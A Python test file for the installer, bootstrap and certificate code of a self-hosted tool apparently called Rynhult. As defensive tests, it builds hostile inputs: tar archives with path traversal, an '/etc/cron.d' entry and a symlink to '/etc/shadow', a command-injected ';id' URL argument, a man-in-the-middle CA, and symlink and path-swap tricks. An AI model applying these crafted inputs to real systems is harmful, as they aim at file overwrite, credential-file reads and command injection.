    assert primary.hits == ["/api/nodes/ca"] and not (tmp_path / "args").exists()


def test_a_second_ca_appended_to_the_right_one_is_not_trusted(tmp_path, stubs):
    """A server in the middle serves the real root (so the fingerprint matches) with its own appended, and a leaf of
    its own: only the first certificate is kept, so its TLS doesn't verify and nothing runs."""
    if not (shutil.which("curl") and shutil.which("openssl")):
        pytest.skip("needs curl and openssl")
    real_key, real = make_ca("Real Root")
    mitm = FakePrimary(tmp_path)  # signs its leaf with its own CA
    try:
        mitm.routes["/api/nodes/ca"] = pem(real) + pem(mitm.ca)
        mitm.routes["/api/nodes/install.sh"] = FAKE_BOOTSTRAP
        line = linux_command(mitm.url, fingerprint_of(real), CODE, "pc")
        result = run(["sh", "-c", line], PATH=f"{stubs}:{os.environ['PATH']}", ACC_TEST_ARGS=str(tmp_path / "args"))
        assert result.returncode != 0 and not (tmp_path / "args").exists()
        assert "/api/nodes/install.sh" not in mitm.hits
    finally:
        mitm.close()
    assert real_key


# ------------------------------------------------------------------- the bootstrap against a fake primary --


def bootstrap(primary: FakePrimary, stubs: Path, *args: str, code: str = CODE, stdin: str = "") -> subprocess.CompletedProcess:
    script = primary.routes["/api/nodes/install.sh"] = bootstrap_script(__version__).encode()
    # The downloaded installer still executes real shell preflights in dry-run mode.
    # Redirect its fixed state probes in this test copy of the bundle as well.
    original_bundle = primary.routes.get('/api/nodes/bundle')
    if original_bundle:
        isolated_bundle = io.BytesIO()
        try:
            with tarfile.open(fileobj=io.BytesIO(original_bundle), mode='r:gz') as source_tar:
                with tarfile.open(fileobj=isolated_bundle, mode='w:gz') as target_tar:
                    for member in source_tar.getmembers():
                        payload = source_tar.extractfile(member) if member.isfile() else None
                        if member.name.endswith('/deploy/node/install.sh'):
                            data = payload.read().replace(b'/etc/acc-node.env', str(stubs.parent / 'no-node.env').encode())
                            data = data.replace(b'/etc/systemd/system/accd.service', str(stubs.parent / 'no-main.service').encode())
                            member.size = len(data)
                            payload = io.BytesIO(data)
                        target_tar.addfile(member, payload)
            primary.routes['/api/nodes/bundle'] = isolated_bundle.getvalue()
        except tarfile.ReadError:
            pass  # Malformed bundle cases must reach the bootstrap unchanged and be refused there.
    path = stubs.parent / "bootstrap.sh"
    # This is the served bootstrap's dry-run path, with host-probe locations replaced before execution.
    script = script.replace(b'/opt/acc', str(stubs.parent / 'node-prefix').encode())
    script = script.replace(b'/etc/systemd/system/accd.service', str(stubs.parent / 'no-main.service').encode())
    path.write_bytes(script)
    ca = stubs.parent / "system-ca.pem"  # --trust system: curl's own CA bundle, here the test CA
    ca.write_bytes(pem(primary.ca))
    return subprocess.run(["sh", str(path), "--dry-run", "--primary", primary.url, *args, "--code", code, "--name", "pc"],
                          input=stdin, capture_output=True, text=True, timeout=180,
                          env={**os.environ, "PATH": f"{stubs}:{os.environ['PATH']}", "CURL_CA_BUNDLE": str(ca),
                               "ACC_INSTALL_TEST_BROKER_ENV": str(stubs.parent / "no-broker-env")})


@pytest.mark.parametrize("code", [CODE, "-"])
def test_bootstrap_dry_run_downloads_checks_unpacks_and_runs_the_wizard(primary, stubs, tmp_path, code):
    out = tmp_path / "bundle"
    primary.routes["/api/nodes/bundle"] = build(REPO, out, version=__version__).read_bytes()
    # --code -: the code arrives on stdin and goes on to the wizard the same way
    result = bootstrap(primary, stubs, "--ca-fingerprint", fingerprint_of(primary.ca), code=code, stdin=CODE + "\n")
    text = result.stdout
    assert result.returncode in (0, 2), text + result.stderr
    assert f"Rynhult {__version__} unpacked to " in text and "(dry run: nothing is changed)" in text
    assert "deploy/node/install.sh --install-prereqs --dry-run" in text
    assert text.rstrip().endswith(f"+ /usr/local/bin/acc-node enroll --primary {primary.url} --ca-fingerprint "
                                  f"{fingerprint_of(primary.ca)} --code - --name pc")
    assert CODE not in text
    assert primary.hits == ["/api/nodes/ca", "/api/nodes/bundle"]
    if code == "-":  # without the code on stdin the wizard stops before installing anything
        result = bootstrap(primary, stubs, "--ca-fingerprint", fingerprint_of(primary.ca), code="-")
        assert result.returncode == 2 and "one-time code on one line of stdin" in result.stderr
        assert "install.sh --install-prereqs" not in result.stdout
    assert not (stubs.parent / "node-prefix").exists()


def tar_bytes(entries) -> bytes:
    """entries: (name, type, data or link target)."""
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for name, kind, data in entries:
            info = tarfile.TarInfo(name)
            if kind == "dir":
                info.type = tarfile.DIRTYPE
                tar.addfile(info)
            elif kind == "link":
                info.type, info.linkname = tarfile.SYMTYPE, data
                tar.addfile(info)
            else:
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


V = f"acc-{__version__}"


@pytest.mark.parametrize("bundle, error", [
    (b"not a gzip at all", "isn't a gzip file"),
    (__import__("gzip").compress(b"plain text, not a tar"), ("isn't a tar archive", "is empty")),
    (tar_bytes([(V, "dir", b""), (f"{V}/../evil", "file", b"x")]), "leaves its folder"),
    (tar_bytes([(V, "dir", b""), ("elsewhere/x", "file", b"x")]), "outside"),
    (tar_bytes([("/etc/cron.d/x", "file", b"x")]), "outside"),
    (tar_bytes([(V, "dir", b""), (f"{V}/link", "link", "/etc/shadow")]), "links or special files"),
    (tar_bytes([("acc-0.0.0/deploy/acc-install", "file", b"x")]), "outside"),
    (tar_bytes([(V, "dir", b""), (f"{V}/README", "file", b"x")]), "no deploy/acc-install"),
], ids=["not-gzip", "not-tar", "dot-dot", "other-folder", "absolute", "link", "other-version", "no-installer"])  # gzip holds the time: byte IDs differ per xdist worker
def test_bootstrap_refuses_a_bad_bundle(primary, stubs, bundle, error):
    primary.routes["/api/nodes/bundle"] = bundle
    result = bootstrap(primary, stubs, "--trust", "system")
    errors = error if isinstance(error, tuple) else (error,)
    assert result.returncode == 1 and any(e in result.stderr for e in errors), result.stdout + result.stderr
    assert "acc-install" not in result.stdout


def test_bootstrap_refuses_odd_arguments(primary, stubs):
    script = stubs.parent / "bootstrap.sh"
    script.write_text(bootstrap_script("1.2.3"))
    for args in (["--primary", "http://acc.example.lan", "--trust", "system", "--code", CODE, "--name", "pc"],
                 ["--primary", "https://acc.example.lan", "--trust", "none", "--code", CODE, "--name", "pc"],
                 ["--primary", "https://acc.example.lan;id", "--trust", "system", "--code", CODE, "--name", "pc"],
                 ["--primary", "https://acc.example.lan", "--trust", "system", "--code", CODE],
                 ["--primary"], ["--what"]):
        result = run(["sh", str(script), "--dry-run", *args], PATH=f"{stubs}:{os.environ['PATH']}")
        assert result.returncode == 1 and result.stderr.startswith("Rynhult: "), (args, result.stderr)
    assert primary.hits == []


# -------------------------------------------------------------------------------------------- the certificate --


def test_mobileconfig_is_an_apple_profile_with_only_the_root():
    _, root = make_ca("Profile Root")
    profile = plistlib.loads(mobileconfig(root, "acc-host"))
    assert profile["PayloadType"] == "Configuration" and profile["PayloadVersion"] == 1
    assert profile["PayloadRemovalDisallowed"] is False and profile["PayloadIdentifier"].startswith("acc.root.")
    (payload,) = profile["PayloadContent"]
    assert payload["PayloadType"] == "com.apple.security.root" and payload["PayloadVersion"] == 1
    assert payload["PayloadContent"] == root.public_bytes(serialization.Encoding.DER)
    assert payload["PayloadUUID"] != profile["PayloadUUID"]
    for key in ("PayloadIdentifier", "PayloadUUID", "PayloadDisplayName"):
        assert profile[key] and payload[key]
    assert plistlib.loads(mobileconfig(root, "acc-host"))["PayloadUUID"] == profile["PayloadUUID"]  # stable


async def test_certificate_details_for_owners_downloads_for_everyone(api, env, tmp_path, monkeypatch, member_accounts):
    from test_auth import do_setup
    from test_users import browser, join
    await do_setup(api, env)
    settings = api.app.state.ctx.settings
    monkeypatch.setattr("acc.server.api.certificate.publicly_trusted", lambda url: False)
    assert (await api.get("/api/certificate")).json()["kind"] == "unverified"
    assert (await api.get("/api/certificate/acc-root.crt")).status_code == 404
    _, root = make_ca("Caddy Local Authority")
    settings.data_dir.mkdir(exist_ok=True)
    (settings.data_dir / "node-ca.pem").write_bytes(pem(root))
    object.__setattr__(settings, "node_ca_file", settings.data_dir / "node-ca.pem")
    details = (await api.get("/api/certificate")).json()
    assert details["kind"] == "caddy" and details["fingerprint"] == fingerprint_of(root)
    assert "Caddy Local Authority" in details["subject"]
    assert datetime.datetime.fromisoformat(details["not_after"]).year >= datetime.date.today().year + 9
    (tmp_path / "other.pem").write_bytes(pem(root))
    object.__setattr__(settings, "node_ca_file", tmp_path / "other.pem")
    assert (await api.get("/api/certificate")).json()["kind"] == "file"

    link = (await api.post("/api/users/invites", json={"role": "member", "account": "spare-agent"})).json()["link"]
    member = browser(api)
    assert (await join(member, link, "riley")).status_code == 200
    assert (await member.get("/api/certificate")).status_code == 403
    assert (await member.get("/api/auth/state")).json()["instance"]["private_ca"] is True
    crt = await member.get("/api/certificate/rynhult-root.crt")
    assert crt.status_code == 200 and x509.load_pem_x509_certificate(crt.content) == root
    assert 'filename="rynhult-root.crt"' in crt.headers["content-disposition"]
    # The pre-rename names stay as aliases, with the same content under the new download name.
    old = await member.get("/api/certificate/acc-root.crt")
    assert old.content == crt.content and 'filename="rynhult-root.crt"' in old.headers["content-disposition"]
    profile = await member.get("/api/certificate/rynhult-root.mobileconfig")
    assert 'filename="rynhult-root.mobileconfig"' in profile.headers["content-disposition"]
    assert (await member.get("/api/certificate/acc-root.mobileconfig")).status_code == 200
    assert plistlib.loads(profile.content)["PayloadContent"][0]["PayloadCertificateFileName"] == "rynhult-root.cer"
    assert profile.headers["content-type"] == "application/x-apple-aspen-config"
    assert plistlib.loads(profile.content)["PayloadContent"][0]["PayloadContent"] == root.public_bytes(
        serialization.Encoding.DER)
    anonymous = browser(api)
    assert (await anonymous.get("/api/certificate/acc-root.crt")).status_code == 401
    await member.aclose()
    await anonymous.aclose()

@pytest.mark.parametrize('provider', ['claude', 'codex', 'cursor', 'antigravity', 'copilot'])
def test_mac_hook_commands_execute_paths_with_spaces_and_quotes(tmp_path, provider):
    import json

    from acc import providers
    from acc.server.compiler import LaunchInputs, compile_files
    tools = tmp_path / "Alex's Library/Application Support/ACC/bin"
    tools.mkdir(parents=True)
    for name in ('acc-hook', 'acc-guard', 'acc-statusline'):
        stub(tools, name, 'printf "executed:%s" "$0"')
    if provider == 'claude':
        files = compile_files(LaunchInputs(provider=provider), str(tools / 'acc-hook'),
                              str(tools / 'acc-statusline')).files
        configs = [json.loads(files['settings.json'])]
    else:
        fake = tmp_path / 'fake-bin'
        fake.mkdir(exist_ok=True)
        stub(fake, provider, 'exit 1')  # never the machine's own CLI (Codex asks its version before trusting hooks)
        providers.get(provider).bootstrap(tmp_path, str(tools / 'acc-hook'), exe=str(fake / provider))
        configs = [json.loads(p.read_text()) for p in tmp_path.rglob('*.json')]
    commands = []
    def collect(value):
        if isinstance(value, dict):
            for key, item in value.items():
                if key in ('command', 'bash') and isinstance(item, str):
                    commands.append(item)
                else:
                    collect(item)
        elif isinstance(value, list):
            for item in value:
                collect(item)
    for config in configs:
        collect(config)
    assert commands
    for command in commands:
        result = run(['sh', '-c', command])
        assert result.returncode == 0, result.stderr
        assert result.stdout.startswith('executed:')

@pytest.mark.parametrize('existing', [':8080 {\n respond "ok"\n}\n', '{\n admin localhost:2019\n}\n:8080 {\n respond "ok"\n}\n'])
def test_caddy_installer_adapts_to_private_admin_socket(tmp_path, existing):
    import json
    caddy = shutil.which('caddy')
    if not caddy:
        pytest.skip('caddy not installed')
    config = tmp_path / 'Caddyfile'
    config.write_text(existing)
    shutil.copy(REPO / 'deploy/caddy/acc-hardening.options', tmp_path / 'acc-hardening.options')
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/caddy-admin.py'), 'configure', str(config)])
    assert result.returncode == 0, result.stderr
    adapted = run([caddy, 'adapt', '--config', str(config), '--adapter', 'caddyfile'])
    assert adapted.returncode == 0, adapted.stderr
    assert json.loads(adapted.stdout)['admin']['listen'] == 'unix//run/caddy/admin.sock|0660'
    checked = subprocess.run(
        ['/usr/bin/python3', str(REPO / 'deploy/lib/caddy-admin.py'), 'check'],
        input=adapted.stdout, capture_output=True, text=True)
    assert checked.returncode == 0, checked.stderr

@pytest.mark.parametrize('config', [{}, {'admin': {}}, {'admin': {'listen': 'localhost:2019'}},
                                  {'admin': {'listen': ':2019'}}, {'admin': {'disabled': True}}])
def test_caddy_installer_refuses_missing_or_tcp_admin(config):
    import json
    result = subprocess.run(['/usr/bin/python3', str(REPO / 'deploy/lib/caddy-admin.py'), 'check'],
                            input=json.dumps(config), capture_output=True, text=True)
    assert result.returncode != 0
    assert 'admin socket' in result.stderr

def test_agent_share_walk_drops_privileges_before_setfacl(tmp_path):
    tools = tmp_path / 'tools'
    tools.mkdir()
    folder = tmp_path / 'shared'
    folder.mkdir()
    (folder / 'file').write_text('keep')
    stub(tools, 'id', 'exit 0')
    stub(tools, 'runuser', 'test "$1" = -u && test "$2" = alex && test "$3" = -- || exit 90\nshift 3\nexport WALK_OWNER=alex\nexec "$@"')
    stub(tools, 'find', 'test "$WALK_OWNER" = alex || exit 91')
    result = run(['bash', str(REPO / 'deploy/broker/acc-agent-share'), 'agent', 'alex', str(folder)],
                 PATH=f"{tools}:{os.environ['PATH']}")
    assert result.returncode == 0, result.stderr


def test_agent_add_chmod_is_unprivileged(tmp_path):
    home = tmp_path / 'home'
    home.mkdir()
    tools = tmp_path / 'tools'
    tools.mkdir()
    stub(tools, 'runuser', 'shift 3; export UNPRIVILEGED=1; exec "$@"')
    stub(tools, 'python3', 'exit 0')
    stub(tools, 'chmod', 'test "$UNPRIVILEGED" = 1')
    text = (REPO / 'deploy/broker/acc-agent-add').read_text()
    block = text[text.index('  if [ ! -f "$home/.claude.json" ];'):text.index("  # Project checkouts")]
    result = run(['bash', '-eu', '-c', block], home=str(home), account='alex',
                 PATH=f"{tools}:{os.environ['PATH']}")
    assert result.returncode == 0, result.stderr


@pytest.mark.parametrize('kind', ['file', 'folder', 'home', 'symlink_parent'])
def test_primary_trusted_tool_refuses_unsafe_tools(tmp_path, kind):
    tools = tmp_path / 'tools'
    tools.mkdir()
    stub(tools, 'uv', 'echo should-not-run')
    path = tools / 'uv'
    if kind == 'file':
        path.chmod(0o777)
    if kind == 'folder':
        tools.chmod(0o777)
    if kind == 'symlink_parent':
        link = tmp_path / 'linked'
        link.symlink_to(tools, target_is_directory=True)
        path = link / 'uv'
        tools.chmod(0o777)
    script = 'source "$1" || exit 90; TRUSTED_TOOL_UID=$(id -u); trusted_tool "$2"'
    result = run(['bash', '-c', script, '-', str(REPO / 'deploy/lib/trusted-tool.sh'), str(path)],
                 HOME=str(tools if kind == 'home' else tmp_path / 'unused'))
    assert result.returncode == 1, result.stderr


def test_primary_trusted_tool_accepts_protected_system_tool():
    result = run(['bash', '-c', 'source "$1"; trusted_tool /usr/bin/python3', '-',
                  str(REPO / 'deploy/lib/trusted-tool.sh')])
    assert result.returncode == 0, result.stderr

@pytest.mark.parametrize('entry', ['secrets', 'secrets/vault.key', 'bundle', 'node-ca.pem', 'nested/file'])
def test_installer_data_preflight_refuses_symlinks(tmp_path, entry):
    data = tmp_path / 'data'
    data.mkdir()
    target = tmp_path / 'untouched'
    target.write_text('canary')
    path = data / entry
    path.parent.mkdir(parents=True, exist_ok=True)
    path.symlink_to(target)
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/data-paths.py'), 'check', str(data),
                  str(os.getuid())])
    assert result.returncode == 1, result.stderr
    assert 'unsafe' in result.stderr
    assert target.read_text() == 'canary'


def test_installer_data_preflight_accepts_owned_tree(tmp_path):
    data = tmp_path / 'data'
    (data / 'secrets').mkdir(parents=True)
    (data / 'secrets/vault.key').write_text('existing-key')
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/data-paths.py'), 'check', str(data),
                  str(os.getuid())])
    assert result.returncode == 0, result.stderr


def test_vault_key_creation_refuses_dangling_link(tmp_path):
    tools = tmp_path / 'tools'
    tools.mkdir()
    stub(tools, 'runuser', 'shift 3; exec "$@"')
    data = tmp_path / 'data'
    (data / 'secrets').mkdir(parents=True)
    target = tmp_path / 'must-not-create'
    (data / 'secrets/vault.key').symlink_to(target)
    text = (REPO / 'deploy/install.sh').read_text()
    block = text[text.index('/usr/bin/python3 -I "$REPO/deploy/lib/data-paths.py" check'):text.index('install -d -o acc -g acc -m 0755 /srv/acc/catalog')]
    block = block.replace('/srv/acc/data', str(data)).replace('"$(id -u acc)"', str(os.getuid()))
    result = run(['bash', '-eu', '-c', block], PATH=f"{tools}:{os.environ['PATH']}", REPO=str(REPO))
    assert result.returncode != 0  # the data-path check refuses the link before the key helper runs
    assert not target.exists()


def test_bundle_install_never_overwrites_link_target(tmp_path):
    data = tmp_path / 'data'
    (data / 'bundle').mkdir(parents=True)
    target = tmp_path / 'target'
    target.write_text('canary')
    (data / 'bundle/acc-1.tar.gz').symlink_to(target)
    source = tmp_path / 'source.tar.gz'
    source.write_text('bundle')
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/data-paths.py'), 'bundle', str(data),
                  str(os.getuid()), str(source), 'acc-1.tar.gz'])
    assert result.returncode == 1, result.stderr
    assert target.read_text() == 'canary'

@pytest.mark.parametrize('kind', ['file', 'directory'])
def test_web_artifact_install_refuses_symlinks(tmp_path, kind):
    source = tmp_path / 'dist'
    source.mkdir()
    target = tmp_path / 'private'
    if kind == 'file':
        target.write_text('canary')
    else:
        target.mkdir()
        (target / 'secret').write_text('canary')
    (source / 'asset').symlink_to(target, target_is_directory=kind == 'directory')
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/copy-web.py'), str(source), str(tmp_path / 'out')])
    assert result.returncode == 1, result.stderr
    assert 'unsafe' in result.stderr
    assert not list((tmp_path / 'out').rglob('secret'))


def test_web_artifact_install_copies_regular_files(tmp_path):
    source = tmp_path / 'dist'
    (source / 'assets').mkdir(parents=True)
    (source / 'index.html').write_text('<html>Rynhult</html>')
    (source / 'assets/app.js').write_text('app')
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/copy-web.py'), str(source), str(tmp_path / 'out')])
    assert result.returncode == 0, result.stderr
    assert (tmp_path / 'out/assets/app.js').read_text() == 'app'


def test_web_install_retains_exactly_one_previous_generation_and_current_html(tmp_path):
    source, target = tmp_path / 'build', tmp_path / 'installed'
    (source / 'assets').mkdir(parents=True)
    (target / 'assets').mkdir(parents=True)
    (target / 'assets/legacy.js').write_text('before generation inventories')
    command = ['/usr/bin/python3', str(REPO / 'deploy/lib/copy-web.py'), str(source), str(target),
               '--keep-previous-assets']
    for generation in ('one', 'two', 'three'):
        for asset in (source / 'assets').iterdir():
            asset.unlink()
        (source / 'assets' / f'{generation}.js').write_text(generation)
        (source / 'assets' / 'shared.css').write_text('shared')
        (source / 'index.html').write_text(generation)
        (source / 'sw.js').write_text(generation)
        result = run(command)
        assert result.returncode == 0, result.stderr
        assert (target / 'index.html').read_text() == generation
        assert (target / 'sw.js').read_text() == generation
        expected = {'legacy.js', 'one.js', 'shared.css'} if generation == 'one' else {
            f'{generation}.js', 'one.js' if generation == 'two' else 'two.js', 'shared.css'}
        assert {p.name for p in (target / 'assets').iterdir()} == expected


def test_failed_web_update_leaves_the_served_build_intact(tmp_path):
    source, target = tmp_path / 'build', tmp_path / 'installed'
    source.mkdir()
    target.mkdir()
    (target / 'index.html').write_text('working')
    private = tmp_path / 'private'
    private.write_text('canary')
    (source / 'linked.js').symlink_to(private)
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/copy-web.py'), str(source), str(target),
                  '--keep-previous-assets'])
    assert result.returncode == 1
    assert (target / 'index.html').read_text() == 'working'
    assert not (target / 'linked.js').exists()


@pytest.mark.parametrize('inventory', ['../private', '/private', 'nested/../../private'])
def test_previous_web_inventory_cannot_copy_outside_assets(tmp_path, inventory):
    import json

    source, target = tmp_path / 'build', tmp_path / 'installed'
    source.mkdir()
    (source / 'index.html').write_text('new')
    (target / '.vite').mkdir(parents=True)
    (target / 'index.html').write_text('working')
    (target / '.vite/asset-files.json').write_text(json.dumps([inventory]))
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/copy-web.py'), str(source), str(target),
                  '--keep-previous-assets'])
    assert result.returncode == 1
    assert 'invalid asset inventory' in result.stderr
    assert (target / 'index.html').read_text() == 'working'


def test_previous_web_assets_never_follow_links(tmp_path):
    source, target = tmp_path / 'build', tmp_path / 'installed'
    source.mkdir()
    (source / 'index.html').write_text('new')
    (target / 'assets').mkdir(parents=True)
    (target / 'index.html').write_text('working')
    private = tmp_path / 'private'
    private.write_text('canary')
    (target / 'assets/old.js').symlink_to(private)
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/copy-web.py'), str(source), str(target),
                  '--keep-previous-assets'])
    assert result.returncode == 1
    assert 'non-regular output' in result.stderr
    assert (target / 'index.html').read_text() == 'working'


def test_web_artifact_install_refuses_symlink_in_source_ancestor(tmp_path):
    source = tmp_path / 'build'
    source.mkdir()
    private = tmp_path / 'private'
    (private / 'static').mkdir(parents=True)
    (private / 'static/secret').write_text('canary')
    (source / 'server').symlink_to(private, target_is_directory=True)
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/copy-web.py'),
                  str(source / 'server/static'), str(tmp_path / 'out')])
    assert result.returncode == 1, result.stderr
    assert not (tmp_path / 'out/secret').exists()


def test_installer_data_preflight_refuses_wrong_owner(tmp_path):
    data = tmp_path / 'data'
    data.mkdir()
    result = run(['/usr/bin/python3', str(REPO / 'deploy/lib/data-paths.py'), 'check', str(data),
                  str(os.getuid() + 1)])
    assert result.returncode == 1
    assert 'wrong owner' in result.stderr


def test_vault_key_creation_is_private_and_idempotent(tmp_path):
    import base64
    tools = tmp_path / 'tools'
    tools.mkdir()
    stub(tools, 'runuser', 'test "$1 $2 $3" = "-u acc --" || exit 90; shift 3; exec "$@"')
    data = tmp_path / 'data'
    (data / 'secrets').mkdir(parents=True)
    text = (REPO / 'deploy/install.sh').read_text()
    block = text[text.index('/usr/bin/python3 -I "$REPO/deploy/lib/data-paths.py" check'):text.index('install -d -o acc -g acc -m 0755 /srv/acc/catalog')]
    block = block.replace('/srv/acc/data', str(data)).replace('"$(id -u acc)"', str(os.getuid()))
    key = data / 'secrets/vault.key'
    for _ in range(2):
        result = run(['bash', '-eu', '-c', block], PATH=f"{tools}:{os.environ['PATH']}", REPO=str(REPO))
        assert result.returncode == 0, result.stderr
        if key.exists() and _ == 0:
            original = key.read_bytes()
    assert len(base64.b64decode(key.read_bytes())) == 32
    assert key.read_bytes() == original
    assert key.stat().st_mode & 0o777 == 0o600


def test_web_build_runs_npm_only_through_the_build_account(tmp_path):
    tools = tmp_path / 'tools'
    tools.mkdir()
    marker = tmp_path / 'unprivileged'
    repo = tmp_path / 'repo'
    (repo / 'web').mkdir(parents=True)
    (repo / 'web/package.json').write_text('{}')
    (repo / 'src/acc/server/static').mkdir(parents=True)
    stub(tools, 'id', 'exit 0')
    stub(tools, 'chown', 'exit 0')
    stub(tools, 'runuser', f'test "$1 $2 $3" = "-u acc-build --" || exit 90; touch "{marker}"; shift 3; exec "$@"')
    stub(tools, 'npm', f'test -f "{marker}" || exit 91\n'
         'if [ "$1 $2" = "run build" ]; then mkdir -p ../src/acc/server/static; echo built > ../src/acc/server/static/index.html; fi')
    script = (REPO / 'deploy/lib/build-assets.sh').read_text()
    script = script.replace('PATH=/usr/bin:/bin', f'PATH={tools}:/usr/bin:/bin')
    (repo / 'deploy/lib').mkdir(parents=True)
    (repo / 'deploy/lib/build-assets.sh').write_text(script)
    shutil.copy(REPO / 'deploy/lib/copy-web.py', repo / 'deploy/lib/copy-web.py')
    installer = (REPO / 'deploy/install.sh').read_text()
    fragment = installer[installer.index('echo "== web UI"'):installer.index('echo "== source bundle:')]
    result = run(['bash', '-eu', '-c', fragment], REPO=str(repo), PATH=f"{tools}:{os.environ['PATH']}")
    assert result.returncode == 0, result.stderr
    assert (repo / 'src/acc/server/static/index.html').read_text() == 'built\n'


@pytest.mark.parametrize('cloudflare', [False, True, 'managed'])
def test_caddy_install_section_provisions_socket_and_runtime_in_both_modes(tmp_path, cloudflare, request):
    import json
    caddy = shutil.which('caddy')
    if not caddy:
        pytest.skip('caddy not installed')
    if cloudflare and 'dns.providers.cloudflare' not in run([caddy, 'list-modules']).stdout:
        pytest.skip('Caddy Cloudflare module not installed')
    # As root, caddy-check runs Caddy as the caddy user, which can't enter pytest's private temp folder.
    base = tmp_path
    if os.geteuid() == 0:
        base = Path(tempfile.mkdtemp(prefix='acc-caddy-', dir='/tmp'))
        base.chmod(0o755)
        request.addfinalizer(lambda: shutil.rmtree(base, ignore_errors=True))
    etc = base / 'etc'
    (etc / 'caddy').mkdir(parents=True)
    (etc / 'caddy/Caddyfile').write_text(':8080 {\n respond "stock site"\n}\n')
    if cloudflare:
        token = etc / ('caddy/acc-dns/current.env' if cloudflare == 'managed' else 'caddy/cloudflare.env')
        token.parent.mkdir(mode=0o700, exist_ok=True)
        token.write_text('CF_API_TOKEN=EXAMPLE\n')
        token.chmod(0o600)
    tools = tmp_path / 'tools'
    tools.mkdir()
    stub(tools, 'systemctl', 'exit 0')
    stub(tools, 'id', 'exit 0')
    stub(tools, 'runuser', f'echo "$@" >> {tmp_path / "runuser.log"}')
    script = (REPO / 'deploy/install.sh').read_text()
    script = script[script.index('echo "== caddy:'):script.index('echo "== private certificate:')]
    script = script.replace('/etc/caddy', str(etc / 'caddy')).replace('/etc/systemd', str(etc / 'systemd'))
    script = script.replace('/usr/local/bin/caddy', caddy if cloudflare else str(tmp_path / 'not-installed'))
    result = run(['bash', '-euo', 'pipefail', '-c', 'trusted_tool() { return 0; }; ' + script],
                 REPO=str(REPO), ACC_HOST='acc.example.com', ZONE='example.com' if cloudflare else '',
                 PATH=f"{tools}:{os.environ['PATH']}")
    assert result.returncode == 0, result.stderr
    runtime = etc / 'systemd/system/caddy.service.d/runtime.conf'
    assert 'RuntimeDirectory=caddy' in runtime.read_text()
    if cloudflare:
        assert (etc / 'caddy/acc.d/example.com-wildcard.caddy').exists()
    adapted = run([caddy, 'adapt', '--config', str(etc / 'caddy/Caddyfile')],
                  CF_API_TOKEN='EXAMPLE', ACC_DNS_CONFIG='dns cloudflare EXAMPLE')
    assert adapted.returncode == 0, adapted.stderr
    assert json.loads(adapted.stdout)['admin']['listen'] == 'unix//run/caddy/admin.sock|0660'
    assert json.loads(adapted.stdout)['admin']['config']['persist'] is False  # SRD-01
    if cloudflare:
        assert '"name": "cloudflare"' in json.dumps(json.loads(adapted.stdout)['apps']['tls'])
    assert (tmp_path / 'runuser.log').read_text() == '-u caddy -- rm -f /var/lib/caddy/.config/caddy/autosave.json\n'


def test_guide_clone_commands_name_no_particular_repository():
    """Q18: the Guide's clone command pointed at a made-up organisation. Since the public repository exists
    (rynhult/rynhult, final UX audit for rc.1), both clone commands name it and nothing else."""
    guide = (REPO / 'docs/wiki/User-Guide/Install.md').read_text()
    assert guide.count('git clone https://github.com/rynhult/rynhult acc') == 2
    assert 'git clone <' not in guide
    assert 'example-org' not in guide


def test_chrome_apparmor_executable_directory_is_protected(tmp_path):
    tools = tmp_path / 'tools'
    tools.mkdir()
    stub(tools, 'install', 'test "$1 $2 $3 $4 $5 $6 $7" = "-d -o root -g root -m 0755" || exit 90; shift 5; exec /usr/bin/install -d "$@"')
    text = (REPO / 'deploy/install.sh').read_text()
    fragment = text[text.index("# The backup timer is the operator's choice"):text.index('source "$REPO/deploy/lib/apparmor-userns.sh"')]
    fragment = fragment.replace('/srv/acc/tools', str(tmp_path / 'installed-tools'))
    result = run(['bash', '-eu', '-c', fragment], PATH=f"{tools}:{os.environ['PATH']}")
    assert result.returncode == 0, result.stderr
    directory = tmp_path / 'installed-tools/ms-playwright'
    assert directory.is_dir()
    assert directory.stat().st_mode & 0o777 == 0o755


def test_trusted_uv_selection_executes_the_same_path_that_was_validated(tmp_path):
    tools = tmp_path / 'tools'
    tools.mkdir()
    stub(tools, 'uv', 'exit 91')
    malicious = tmp_path / 'replaced-uv'
    malicious.write_text('must not be selected')
    counter = tmp_path / 'readlink-count'
    protected = Path('/usr/bin/python3').resolve()
    stub(tools, 'readlink', f'''
case "$*" in
  *"{tools}/uv"*)
    if [ -e "{counter}" ]; then echo "{malicious}"; else touch "{counter}"; echo "{protected}"; fi ;;
  *) exec /usr/bin/readlink "$@" ;;
esac''')
    result = run(['bash', '-c', 'source "$1"; find_uv', '-', str(REPO / 'deploy/lib/trusted-tool.sh')],
                 PATH=f"{tools}:{os.environ['PATH']}")
    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == str(protected)


def test_caddy_selection_keeps_the_path_that_passed_validation(tmp_path):
    tools = tmp_path / 'tools'
    tools.mkdir()
    stub(tools, 'caddy', 'exit 91')
    stub(tools, 'install', 'exit 0')
    stub(tools, 'cmp', 'exit 1')
    counter = tmp_path / 'resolved'
    protected = Path('/usr/bin/python3').resolve()
    replaced = tmp_path / 'replaced-caddy'
    stub(tools, 'readlink', f'''
case "$*" in
  *"{tools}/caddy"*)
    if [ -e "{counter}" ]; then echo "{replaced}"; else touch "{counter}"; echo "{protected}"; fi ;;
  *) exec /usr/bin/readlink "$@" ;;
esac''')
    cloudflare = tmp_path / 'cloudflare.env'
    cloudflare.touch()
    text = (REPO / 'deploy/install.sh').read_text()
    fragment = text[text.index('CADDY="" CADDY_UNIT_CHANGED='):text.index('if [ -z "$ACC_HOST" ]')]
    fragment = fragment.replace('/usr/local/bin/caddy', str(tools / 'caddy'))
    fragment = fragment.replace('/etc/caddy/cloudflare.env', str(cloudflare))
    result = run(['bash', '-eu', '-c', 'source "$REPO/deploy/lib/trusted-tool.sh"; ' + fragment + '\necho "$CADDY"'],
                 REPO=str(REPO), PATH=f"{tools}:{os.environ['PATH']}")
    assert result.returncode == 0, result.stderr
